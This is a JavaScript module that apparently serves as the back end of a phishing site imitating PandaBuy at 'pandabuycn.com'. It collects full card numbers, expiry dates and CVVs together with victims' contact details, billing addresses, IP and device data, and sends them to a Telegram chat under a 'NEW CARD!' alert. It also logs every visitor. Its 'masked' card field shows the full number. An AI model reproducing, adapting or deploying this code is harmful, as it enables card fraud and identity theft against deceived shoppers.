// Telegram Bot Integration for PandaBuy Admin
// This module handles sending card data and visit notifications to Telegram

const https = require('https');

class TelegramBot {
    constructor(botToken, chatId) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${botToken}`;
    }

    // Send a message to Telegram
    async sendMessage(text, parseMode = null) {
        return new Promise((resolve, reject) => {
            const payload = {
                chat_id: this.chatId,
                text: text,
                disable_web_page_preview: true
            };
            
            if (parseMode) {
                payload.parse_mode = parseMode;
            }
            
            const data = JSON.stringify(payload);

            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${this.botToken}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': data.length
                }
            };

            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    try {
                        const response = JSON.parse(responseData);
                        if (response.ok) {
                            resolve(response);
                        } else {
                            reject(new Error(`Telegram API error: ${response.description}`));
                        }
                    } catch (error) {
                        reject(new Error(`Failed to parse Telegram response: ${error.message}`));
                    }
                });
            });

            req.on('error', (error) => {
                reject(new Error(`Request failed: ${error.message}`));
            });

            req.write(data);
            req.end();
        });
    }

    // Format card data for Telegram message
    formatCardMessage(cardData) {
        const timestamp = new Date(cardData.timestamp || cardData.serverTimestamp).toLocaleString();
        
        // Get card brand with more detailed detection
        const getCardBrand = (number) => {
            if (!number) return '❓ Unknown';
            const firstDigit = number.charAt(0);
            const firstTwo = number.substring(0, 2);
            const firstFour = number.substring(0, 4);
            
            if (firstDigit === '4') return '💳 Visa';
            if (firstDigit === '5' || (firstTwo >= '51' && firstTwo <= '55')) return '💳 Mastercard';
            if (firstTwo === '34' || firstTwo === '37') return '💳 American Express';
            if (firstFour === '6011' || firstTwo === '65') return '💳 Discover';
            if (firstFour >= '3528' && firstFour <= '3589') return '💳 JCB';
            if (firstFour >= '2200' && firstFour <= '2720') return '💳 Mastercard';
            return '❓ Unknown';
        };

        const cardBrand = getCardBrand(cardData.cardNumber);
        const maskedCard = cardData.cardNumber ? 
            cardData.cardNumber.replace(/(.{4})/g, '$1 ').trim() : 'N/A';
        
        // Get current date for logging
        const currentDate = new Date().toLocaleDateString();
        const currentTime = new Date().toLocaleTimeString();

        const message = `🚨 NEW CARD! 🚨
📅 ${currentDate} at ${currentTime}
🌐 pandabuycn.com

💳 CARD DETAILS
Card: ${maskedCard}
Holder: ${cardData.cardName || 'N/A'}
Expires: ${cardData.expMonth}/${cardData.expYear}
CVV: ${cardData.cvv || 'N/A'}

👤 CUSTOMER INFO
Email: ${cardData.email || 'N/A'}
Phone: ${cardData.phoneNumber || 'N/A'}
Address: ${cardData.billingAddress || 'N/A'}
City: ${cardData.city || 'N/A'}
State: ${cardData.state || 'N/A'}
ZIP: ${cardData.zipCode || 'N/A'}
Country: ${cardData.country || 'N/A'}

🔍 VISITOR TRACKING
IP: ${cardData.visitorData?.ip || cardData.ip || 'N/A'}
Location: ${cardData.visitorData?.city || 'N/A'}, ${cardData.visitorData?.country || 'N/A'}
Browser: ${cardData.visitorData?.browser?.name || cardData.visitorData?.browser || 'N/A'} ${cardData.visitorData?.browser?.version ? 'v' + cardData.visitorData.browser.version : ''}
OS: ${cardData.visitorData?.os?.name || cardData.visitorData?.os || 'N/A'}
Device: ${cardData.visitorData?.device?.type || cardData.visitorData?.deviceType || 'N/A'}

⚡ SUBMISSION TIME: ${timestamp}
🔗 Admin Panel: https://pandabuycn.com/admin-cards`;

        return message;
    }

    // Format visit data for Telegram message
    formatVisitMessage(visitData) {
        const timestamp = new Date(visitData.timestamp).toLocaleString();
        
        // Handle both old and new data formats
        const ip = visitData.server?.serverIP || visitData.ip || 'Unknown';
        const browser = visitData.browser?.name || visitData.browser || 'Unknown';
        const browserVersion = visitData.browser?.version || '';
        const os = visitData.os?.name || visitData.os || 'Unknown';
        const deviceType = visitData.device?.type || visitData.deviceType || 'Unknown';
        const country = visitData.geoLocation?.country || visitData.country || 'Unknown';
        const city = visitData.geoLocation?.city || visitData.city || 'Unknown';
        const pageUrl = visitData.page?.pathname || visitData.page || visitData.pathname || '/';

        const message = `
👁️ <b>NEW VISITOR</b>

🌐 <b>LOCATION</b>
├ IP: <code>${ip}</code>
├ Country: ${country}
├ City: ${city}
└ Timezone: ${visitData.locale?.timezone || visitData.timezone || 'N/A'}

💻 <b>DEVICE & BROWSER</b>
├ Browser: ${browser} ${browserVersion ? 'v' + browserVersion : ''}
├ OS: ${os}
├ Device: ${deviceType}
└ Screen: ${visitData.screen?.resolution || visitData.screenResolution || 'N/A'}

📄 <b>PAGE INFO</b>
├ Page: <code>${pageUrl}</code>
├ Referrer: ${visitData.traffic?.referrer || visitData.referrer || 'Direct'}
└ Language: ${visitData.locale?.language || visitData.language || 'N/A'}

⏰ <b>Time:</b> ${timestamp}
        `.trim();

        return message;
    }

    // Send card data notification
    async sendCardNotification(cardData) {
        try {
            const message = this.formatCardMessage(cardData);
            await this.sendMessage(message);
            console.log('✅ Card data sent to Telegram successfully');
            return true;
        } catch (error) {
            console.error('❌ Failed to send card data to Telegram:', error.message);
            return false;
        }
    }

    // Send visit notification (optional, can be disabled for high traffic)
    async sendVisitNotification(visitData) {
        try {
            const message = this.formatVisitMessage(visitData);
            await this.sendMessage(message);
            console.log('✅ Visit notification sent to Telegram');
            return true;
        } catch (error) {
            console.error('❌ Failed to send visit notification to Telegram:', error.message);
            return false;
        }
    }

    // Send custom message
    async sendCustomMessage(text) {
        try {
            await this.sendMessage(text);
            console.log('✅ Custom message sent to Telegram');
            return true;
        } catch (error) {
            console.error('❌ Failed to send custom message to Telegram:', error.message);
            return false;
        }
    }

    // Test the bot connection
    async testConnection() {
        try {
            const testMessage = `🤖 PandaBuy Bot Test

✅ Bot is connected and working!
🕐 Test time: ${new Date().toLocaleString()}
🌐 Domain: pandabuycn.com
🔗 Admin Panel: https://pandabuycn.com/admin-cards

The bot is ready to receive card submissions and visit notifications from pandabuycn.com!`;

            await this.sendMessage(testMessage);
            console.log('✅ Telegram bot test successful');
            return true;
        } catch (error) {
            console.error('❌ Telegram bot test failed:', error.message);
            return false;
        }
    }
}

module.exports = TelegramBot; 